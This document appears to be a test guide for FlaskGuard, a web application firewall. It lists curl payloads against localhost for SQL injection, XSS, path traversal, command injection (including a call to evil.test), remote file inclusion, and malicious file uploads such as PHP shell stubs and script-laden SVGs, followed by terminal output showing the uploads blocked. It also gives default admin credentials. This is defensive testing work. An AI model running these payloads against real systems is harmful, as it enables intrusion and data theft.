# FlaskGuard Attack Testing Payloads

Target through FlaskGuard:

```text
http://localhost
```

Admin dashboard:

```text
http://localhost/admin
admin / admin123
```

A FlaskGuard block returns JSON with `error` and `category`. If you see an HTML `Bad Request`, that is usually the backend rejecting malformed JSON, not FlaskGuard.

## Regex Attacks

### SQL Injection

```powershell
curl.exe "http://localhost/api/product/list/search/%27%20OR%201%3D1%20--"
curl.exe "http://localhost/api/product/list/search/UNION%20SELECT%20password%20FROM%20users"
curl.exe "http://localhost/api/product/list/search/%27%20AND%20SLEEP(5)--"
curl.exe "http://localhost/api/product/list/search/1%20OR%201%3D1"

```

### XSS

```powershell
curl.exe "http://localhost/api/product/list/search/%3Cscript%3Ealert(1)%3C%2Fscript%3E"
curl.exe "http://localhost/api/product/list/search/javascript%3Aalert(1)"
curl.exe "http://localhost/api/product/list/search/%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
curl.exe "http://localhost/api/product/list/search/%3Csvg%20onload%3Dalert(1)%3E"
```

### Path Traversal

```powershell
curl.exe "http://localhost/api/product/list/search/..%2F..%2Fetc%2Fpasswd"
curl.exe "http://localhost/api/product/list/search/..%5C..%5Cwindows%5Csystem32"
curl.exe "http://localhost/api/product/list/search/%252e%252e%252fetc%252fpasswd"
curl.exe "http://localhost/api/product/list/search/c:%5Cwindows%5Csystem32%5Cconfig%5Csam"
```

### Command Injection

```powershell
curl.exe "http://localhost/api/product/list/search/%3B%20ls%20-la"
curl.exe "http://localhost/api/product/list/search/%7C%20cat%20%2Fetc%2Fpasswd"
curl.exe "http://localhost/api/product/list/search/%24(whoami)"
curl.exe "http://localhost/api/product/list/search/%26%20curl%20http%3A%2F%2Fevil.test"
```

### File Injection

```powershell
curl.exe "http://localhost/api/product/list/search/php%3A%2F%2Finput"
curl.exe "http://localhost/api/product/list/search/data%3A%2F%2Ftext%2Fhtml"
curl.exe "http://localhost/api/product/list/search/expect%3A%2F%2Fid"
curl.exe "http://localhost/api/product/list/search/http%3A%2F%2Fevil.test%2Fshell.php"
```

## ML Classifier Attacks

ML is a fallback. These payloads are intended to be blocked as `Suspicious Input` by the `ML Classifier` when regex does not catch them first.

```powershell
curl.exe "http://localhost/api/product/list/search/%7B%7Bconfig.items()%7D%7D"
curl.exe "http://localhost/api/product/list/search/constructor.constructor.alert.1"
curl.exe "http://localhost/api/product/list/search/mongodb%20where%20function%20return%20true"
curl.exe "http://localhost/api/product/list/search/password%20regex%20wildcard%20login%20bypass"
curl.exe "http://localhost/api/product/list/search/ldap%20uid%20wildcard%20objectclass%20wildcard"
```

Known regex-caught example, useful to confirm blocking but not ML:

```powershell
curl.exe "http://localhost/api/product/list/search/eval%28atob%28%27YWxlcnQoMSk%3D%27%29%29"
```

## File Scanner Attacks

Get an admin token first. PowerShell-safe JSON:

```powershell
$body = '{"email":"admin@example.com","password":"admin123"}'
curl.exe -X POST "http://localhost/api/auth/login" -H "Content-Type: application/json" --data-raw $body
$TOKEN = "Bearer paste-token-here"
```

### Malicious SVG

```powershell
Set-Content -Path "$env:TEMP\malicious.svg" -Value '<svg><script>alert(1)</script></svg>'
curl.exe -X POST "http://localhost/api/product/add" -H "Authorization: $TOKEN" -F "sku=svg-001" -F "name=SVG Attack" -F "description=test" -F "quantity=1" -F "price=10" -F "image=@$env:TEMP\malicious.svg;filename=malicious.svg"
```

### PHP Upload

```powershell
Set-Content -Path "$env:TEMP\shell.php" -Value '<?php echo "owned"; ?>'
curl.exe -X POST "http://localhost/api/product/add" -H "Authorization: $TOKEN" -F "sku=php-001" -F "name=PHP Attack" -F "description=test" -F "quantity=1" -F "price=10" -F "image=@$env:TEMP\shell.php;filename=shell.php"
```

### Double Extension

```powershell
Set-Content -Path "$env:TEMP\shell.php.jpg" -Value '<?php echo "owned"; ?>'
curl.exe -X POST "http://localhost/api/product/add" -H "Authorization: $TOKEN" -F "sku=double-001" -F "name=Double Extension" -F "description=test" -F "quantity=1" -F "price=10" -F "image=@$env:TEMP\shell.php.jpg;filename=shell.php.jpg"
```

### Dangerous ZIP

```powershell
$zipDir = Join-Path $env:TEMP "fg-zip-test"
New-Item -ItemType Directory -Force -Path $zipDir | Out-Null
Set-Content -Path "$zipDir\shell.php" -Value '<?php echo "owned"; ?>'
Compress-Archive -Path "$zipDir\shell.php" -DestinationPath "$env:TEMP\dangerous.zip" -Force
curl.exe -X POST "http://localhost/api/product/add" -H "Authorization: $TOKEN" -F "sku=zip-001" -F "name=Zip Attack" -F "description=test" -F "quantity=1" -F "price=10" -F "image=@$env:TEMP\dangerous.zip;filename=dangerous.zip"
```
┌──(hm㉿DESKTOP-8LPQSF2)-[/mnt/c/Users/Hamza]
└─$ curl.exe -X POST "http://localhost/api/product/add" -H "Authorization: $TOKEN" -F "sku=test-001" -F "name=Test" -F "description=test" -F "quantity=1" -F "price=10" -F "image=@C:\Users\Hamza\Documents\#Projects\FlaskGuard-main\FlaskGuard-main\FlaskGuard\test_files\sample.xlsm"
{"category":"Disallowed File Type","detail":"Extension '.xlsm' is not permitted","error":"Malicious file detected","filename":"sample.xlsm"}

┌──(hm㉿DESKTOP-8LPQSF2)-[/mnt/c/Users/Hamza]
└─$ curl.exe -X POST "http://localhost/api/product/add" -H "Authorization: $TOKEN" -F "sku=test-001" -F "name=Test" -F "description=test" -F "quantity=1" -F "price=10" -F "image=@C:\Users\Hamza\Documents\#Projects\FlaskGuard-main\FlaskGuard-main\FlaskGuard\test_files\script.php"
{"category":"File Injection","detail":"Malicious filename: script.php","error":"Malicious file detected \u2014 IP auto-banned","filename":"script.php"}

┌──(hm㉿DESKTOP-8LPQSF2)-[/mnt/c/Users/Hamza]
└─$ curl.exe -X POST "http://localhost/api/product/add" -H "Authorization: $TOKEN" -F "sku=test-001" -F "name=Test" -F "description=test" -F "quantity=1" -F "price=10" -F "image=@C:\Users\Hamza\Documents\#Projects\FlaskGuard-main\FlaskGuard-main\FlaskGuard\test_files\exploit.exe"
{"category":"File Injection","detail":"Malicious filename: exploit.exe","error":"Malicious file detected","filename":"exploit.exe"}

┌──(hm㉿DESKTOP-8LPQSF2)-[/mnt/c/Users/Hamza]
└─$ curl.exe -X POST "http://localhost/api/product/add" -H "Authorization: $TOKEN" -F "sku=test-001" -F "name=Test" -F "description=test" -F "quantity=1" -F "price=10" -F "image=@C:\Users\Hamza\Documents\#Projects\FlaskGuard-main\FlaskGuard-main\FlaskGuard\test_files\image.php.jpg"
{"category":"File Injection","detail":"Malicious filename: image.php.jpg","error":"Malicious file detected \u2014 IP auto-banned","filename":"image.php.jpg"}

┌──(hm㉿DESKTOP-8LPQSF2)-[/mnt/c/Users/Hamza]
└─$ curl.exe -X POST "http://localhost/api/product/add" -H "Authorization: $TOKEN" -F "sku=test-001" -F "name=Test" -F "description=test" -F "quantity=1" -F "price=10" -F "image=@C:\Users\Hamza\Documents\#Projects\FlaskGuard-main\FlaskGuard-main\FlaskGuard\test_files\logo.svg"
{"category":"XSS","detail":"<script>","error":"Malicious file detected","filename":"logo.svg"}

┌──(hm㉿DESKTOP-8LPQSF2)-[/mnt/c/Users/Hamza]
└─$ curl.exe -X POST "http://localhost/api/product/add" -H "Authorization: $TOKEN" -F "sku=test-001" -F "name=Test" -F "description=test" -F "quantity=1" -F "price=10" -F "image=@C:\Users\Hamza\Documents\#Projects\FlaskGuard-main\FlaskGuard-main\FlaskGuard\test_files\logo_onload.svg"
{"category":"XSS","detail":"onload=","error":"Malicious file detected","filename":"logo_onload.svg"}

┌──(hm㉿DESKTOP-8LPQSF2)-[/mnt/c/Users/Hamza]
└─$ curl.exe -X POST "http://localhost/api/product/add" -H "Authorization: $TOKEN" -F "sku=test-001" -F "name=Test" -F "description=test" -F "quantity=1" -F "price=10" -F "image=@C:\Users\Hamza\Documents\#Projects\FlaskGuard-main\FlaskGuard-main\FlaskGuard\test_files\malicious.svg"
{"category":"XSS","detail":"<script>","error":"Malicious file detected","filename":"malicious.svg"}

┌──(hm㉿DESKTOP-8LPQSF2)-[/mnt/c/Users/Hamza]
└─$ curl.exe -X POST "http://localhost/api/product/add" -H "Authorization: $TOKEN" -F "sku=test-001" -F "name=Test" -F "description=test" -F "quantity=1" -F "price=10" -F "image=@C:\Users\Hamza\Documents\#Projects\FlaskGuard-main\FlaskGuard-main\FlaskGuard\test_files\photo.png"
{"category":"Server-Side Script Upload","detail":"File starts with PHP/shell magic bytes despite extension '.png'","error":"Malicious file detected","filename":"photo.png"}

## If You Get Auto-Banned

```powershell
curl.exe -u admin:admin123 "http://localhost/admin/api/blacklist"
curl.exe -u admin:admin123 -X POST "http://localhost/admin/api/unban" -H "Content-Type: application/json" --data-raw '{"ip":"127.0.0.1"}'
```

Expected result for malicious tests:

```text
403 Forbidden
Check http://localhost/admin for category and detection method.
```

